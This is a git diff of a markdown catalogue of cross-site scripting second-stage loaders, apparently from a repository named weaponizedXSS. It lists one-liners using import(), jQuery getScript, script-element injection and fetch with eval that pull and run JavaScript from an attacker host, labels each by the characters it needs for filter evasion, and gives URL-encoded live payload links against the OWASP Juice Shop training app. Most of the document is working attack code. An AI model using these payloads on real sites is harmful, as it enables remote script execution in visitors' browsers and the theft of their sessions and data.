@@ -20,7 +20,13 @@ In case the second stage payload is hosted on GitHub (`Content-Type: text/plain`
         * proxied: https://cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS@latest/basic/simplePoC/simpleStd.js
     * **NOTE**: to avoid errors with jsdelivr (`Failed to fetch version info for ...`), use `@latest` as version of GitHub repository
 
-## `import()` - round brackets; quote; `Access-Control-Allow-Origin` required
+## `import()`
+
+* contains:
+    * round brackets
+    * quote
+* NOTES:
+    * `Access-Control-Allow-Origin` required
 
 ```
 import('//ATTACKER_WS/PATH/JS_PAYLOAD');
@@ -30,7 +36,12 @@ import('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22import(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
 
-## [jQuery] `$.getScript()` - round brackets; quote; dollar
+## [jQuery] `$.getScript()`
+
+* contains:
+    * round brackets
+    * quote
+    * dollar
 
 ```
 $.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
@@ -42,7 +53,11 @@ $.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
     * **NOTE**: it seems that, in the meantime, OWASP Juice Shop stopped using jQuery, so the live example link will NOT work
 
-## [jQuery] `jQuery.getScript()` - round brackets; quote
+## [jQuery] `jQuery.getScript()`
+
+* contains:
+    * round brackets
+    * quote
 
 ```
 jQuery.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
@@ -54,7 +69,12 @@ jQuery.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
 
     * **NOTE**: it seems that, in the meantime, OWASP Juice Shop stopped using jQuery, so the live example link will NOT work
 
-## `appendChild()` #1 - round brackets; quote; equal
+## `appendChild()` #1
+
+* contains:
+    * round brackets
+    * quote
+    * equal
 
 ```
 with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/JS_PAYLOAD';
@@ -66,6 +86,9 @@ with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/
 
 ## `appendChild()` #2 - round brackets; quote; equal; space
 
+* contains:
+    * 
+
 ```
 var js=document.createElement('script');js.type='text/javascript';js.src='//ATTACKER_WS/PATH/JS_PAYLOAD';document.body.appendChild(js);
 ```
@@ -74,7 +97,17 @@ var js=document.createElement('script');js.type='text/javascript';js.src='//ATTA
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22var%20js%3Ddocument.createElement(%27script%27)%3Bjs.type%3D%27text/javascript%27%3Bjs.src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40latest%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3Bdocument.body.appendChild(js)%3B%22%3E
 
-## `fetch()` #1 - round brackets; right angle bracket; quote; equal; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`
+## `fetch()` #1
+
+* contains:
+    * round brackets
+    * right angle bracket
+    * quote
+    * equal
+    * `eval()`
+* NOTES:
+    * `Access-Control-Allow-Origin` required
+    * works with `Content-Type: text/plain`
 
 ```
 fetch('//ATTACKER_WS/PATH/JS_PAYLOAD').then(r=>r.text().then(t=>eval(t)));
@@ -84,7 +117,17 @@ fetch('//ATTACKER_WS/PATH/JS_PAYLOAD').then(r=>r.text().then(t=>eval(t)));
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch(%27%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js%27).then(r%3D%3Er.text().then(t%3D%3Eeval(t)))%3B%22%3E
 
-## `fetch()` #2 - round brackets; curly brackets; quote; space; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`
+## `fetch()` #2
+
+* contains:
+    * round brackets
+    * curly brackets
+    * quote
+    * space
+    * `eval()`
+* NOTES:
+    * `Access-Control-Allow-Origin` required
+    * works with `Content-Type: text/plain`
 
 ```
 fetch('//ATTACKER_WS/PATH/JS_PAYLOAD').then(function(r){return r.text().then(function(t){return eval(t);})});
@@ -94,7 +137,18 @@ fetch('//ATTACKER_WS/PATH/JS_PAYLOAD').then(function(r){return r.text().then(fun
 
     https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch(%27%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js%27).then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D)%3B%22%3E
 
-## `fetch()` #3 - round brackets; curly brackets; quote; equal; space; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`
+## `fetch()` #3
+
+* contains:
+    * round brackets
+    * curly brackets
+    * quote
+    * equal
+    * space
+    * `eval()`
+* NOTES:
+    * `Access-Control-Allow-Origin` required
+    * works with `Content-Type: text/plain`
 
 ```
 async function g(f){o=await fetch(f);t=await o.text();eval(t);};g('//ATTACKER_WS/PATH/JS_PAYLOAD');
